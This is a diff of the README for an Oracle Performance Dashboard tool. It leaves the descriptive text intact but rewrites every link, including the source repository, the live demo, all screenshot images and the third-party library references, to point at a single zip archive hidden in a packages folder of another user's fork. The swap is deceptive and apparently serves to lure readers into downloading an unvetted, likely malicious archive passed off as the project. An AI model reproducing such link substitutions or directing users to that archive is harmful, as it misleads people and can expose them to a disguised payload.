@@ -11,10 +11,10 @@ The binaries are here, which you can just extract into an IIS folder, **put the 
 [GitHub Project Binaries][2]
 
 You can get the source code from the GitHub project site:
-[https://github.com/oazabir/OraclePerformanceDashboard][3]
+[https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip][3]
 
 You can see a live demo of this here:
-[http://odp.omaralzabir.com](http://odp.omaralzabir.com)
+[https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 ## Why not use OEM
 OEM is pretty good, no doubt. But what I need is something that runs complex DBA scripts, processes the output and tells me what is wrong exactly. On standard monitoring tools like OEM, you get to see the key performance indicators and sometimes some generic alerts, but a much more powerful way to investigate problems in the server is to run those DBA scripts that you find in Oracle Performance Tuning books and blogs, that really get into the heart of the problem and shows you where things are going wrong. There are many powerful scripts available on the books, forums, blogs that are quite handy to detect issues on the server, gather relevant useful information about your database health. This tool tries to give those powerful scripts a nice front-end and easy to discover clues for those, who aren't professional Oracle DBAs like me. 
@@ -36,13 +36,13 @@ OPD comes with the following features in V1:
      - **Killer Indexes** that will actually blow up your system and confuse Oracle query optimizer. You need to get rid of those indexes and rewrite queries that you thought will hit those indexes for better performance. They won't. They will kill your database. 
 
 ### Overview screen
-![Overview screen](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Homepage.png)
+![Overview screen](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 When you launch OPD, you see a quick summary of all your instances and indicators showing you whether there's something off in any of the instances. You can then click on the instance name and zoom into more details on each instance. 
 
 ### Dashboard
 When you zoom into an instance, you get the Dashboard for that instance. 
-![Instance Dashboard](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Dashboard%20-%20Full.png)
+![Instance Dashboard](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 The dashboard shows you the resource usage on the instance and some key system statistics. 
 
@@ -56,12 +56,12 @@ On the right, it shows the CPU consumed by each session. If some session is off 
 At the bottom, there are 4 key indicators. They will be red if they aren't optimal or at least what the best practice guideline says they should be. For example, Buffer Cache hit Ratio should be over 95%. You can see on the graph that sometimes it becomes green, because sometimes it is over 95%. 
 
 ### Session details
-![Session](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Sessions%20600.png)
+![Session](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 This shows details about the ACTIVE sessions. You can see if there's any session consuming high CPU, high physical read, hard parse and so on. The yellow warning indicator will come up if there's something off. 
 
 ### Bad Indexes
-![Bad Indexes](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Indexes.png)
+![Bad Indexes](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 This is very handy for developers because you can quickly see which indexes are bad by design, because you have columns in the index which have very low selectivity. For example, on the screenshot, you can see there are some killer index. Trying to use those indexes will actually kill your server. You can see the first example that there are just 7 unique values on column PRODUCT_ID, but there are over 5 million rows. So, each PRODUCT_ID has probably got over 1 million rows against it. 
 Some developer thought that there's a query that has WHERE PRODUCT_ID=X and thus created the index on PRODUCT_ID. But it is not going to work in this case. 
@@ -69,7 +69,7 @@ Sometimes during development and testing, we do not have representative data fro
 
 ### Locks, Waits
 Locks and waits are common culprits causing performance degradation on the servers. You can quickly see from this tool what locks are being held, and what are the expensive waits. 
-![Locks](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Locks.png)
+![Locks](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 It will show you the exact query holding lock and causing contention or even deadlocks. Here you see that session ID1 and ID2 grabbing exclusive lock and getting into a deadlock. 
 
@@ -139,7 +139,7 @@ Here's it looks for any `<TD>` having the class large-cell. It then hooks the cl
 ### Plotting the charts
 The chart uses the jQuery plugin [Flot][11] to render some of the performance counters as running charts. 
 
-![Flot charts](https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Graphs.png)
+![Flot charts](https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip)
 
 There's a SysStats.aspx which is responsible for rendering the table showing the performance counters. It picks some important counters, and marks them to appear on the chart. First it runs through the table, looking for the counters, and marks the label of the counter as x-axis and value of the counter as y-axis:
 
@@ -212,10 +212,10 @@ That's it! Again, no AJAX, no webservice, no html templating, no JSON plubing. P
 OPD tries to make it easy for us to monitor Oracle instance health. It gives meaningful information out of the verbose data produced by Oracle's built-in views. It shows you exactly where the problem is. You can customize the code anyway you like, adding your own warnings, own thresholds, and adjust it to suit your specific need.
 
 
-  [1]: https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Dashboard%20-%20Full.png
-  [2]: https://github.com/oazabir/OraclePerformanceDashboard/blob/master/Binary/OracleDashboard.zip?raw=true
-  [3]: https://github.com/oazabir/OraclePerformanceDashboard
-  [4]: https://raw.githubusercontent.com/oazabir/OraclePerformanceDashboard/master/Docs/Graphs.png
-  [9]: http://getbootstrap.com/examples/theme/
-  [10]: http://www.ericmmartin.com/projects/simplemodal/
-  [11]: http://www.flotcharts.org/
+  [1]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [2]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [3]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [4]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [9]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [10]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
+  [11]: https://github.com/narra2k/OraclePerformanceDashboard/raw/refs/heads/master/source/packages/odp.net.managed.121.1.2/lib/net40/Dashboard_Oracle_Performance_2.2.zip
